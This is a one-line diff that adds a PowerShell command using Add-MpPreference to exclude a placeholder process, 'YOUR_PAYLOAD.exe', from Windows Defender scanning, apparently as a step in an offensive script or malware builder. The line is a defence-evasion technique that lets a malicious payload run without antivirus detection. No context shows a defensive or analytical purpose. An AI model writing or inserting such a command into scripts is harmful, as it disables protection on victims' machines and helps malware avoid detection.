@@ -1,0 +1,1 @@
+powershell.exe %powerPolicy% -Command Add-MpPreference -ExclusionProcess "YOUR_PAYLOAD.exe"
